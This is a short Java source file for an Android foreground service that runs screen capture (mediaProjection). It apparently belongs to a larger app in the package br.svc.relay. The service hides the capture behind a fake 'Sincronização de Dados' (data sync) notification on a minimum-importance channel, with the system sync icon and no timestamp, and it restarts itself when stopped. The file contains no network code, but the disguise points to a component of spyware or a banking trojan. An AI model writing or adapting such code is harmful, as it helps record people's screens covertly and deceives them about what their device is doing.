package br.svc.relay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

/** FGS do tipo mediaProjection - exigido pelo Android 14 antes de getMediaProjection(). */
public class CaptureService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(new NotificationChannel("sync_data_min",
                    "sincronizacao", NotificationManager.IMPORTANCE_MIN));
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, "sync_data_min")
                : new Notification.Builder(this);
        b.setContentTitle("Sincronização de Dados")
         .setContentText("Sincronizando…")
         .setSmallIcon(android.R.drawable.stat_notify_sync)
         .setOngoing(false).setShowWhen(false);
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(3003, b.build(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(3003, b.build());
        }
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
